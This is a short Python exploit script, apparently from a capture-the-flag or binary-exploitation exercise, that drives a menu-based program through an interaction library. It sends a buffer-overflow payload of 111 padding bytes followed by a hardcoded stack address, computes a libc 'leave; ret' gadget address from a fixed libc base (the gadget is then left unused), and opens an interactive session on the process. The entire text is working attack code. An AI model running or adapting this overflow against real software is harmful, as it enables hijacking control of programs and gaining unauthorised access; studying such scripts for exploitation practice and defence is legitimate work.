import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('Quit'))
p.sendline('1')
print(p.readuntil('Text:'))
libc_base = 0x7f000042c000
leave_ret = p64(libc_base + 0x0000000000042351)
buffer_start = p64(0x7fffffffecd0)  
p.sendline("A"*111 + buffer_start + "B"*8)
print(p.readuntil('Quit'))
p.sendline('2')

p.interactive()
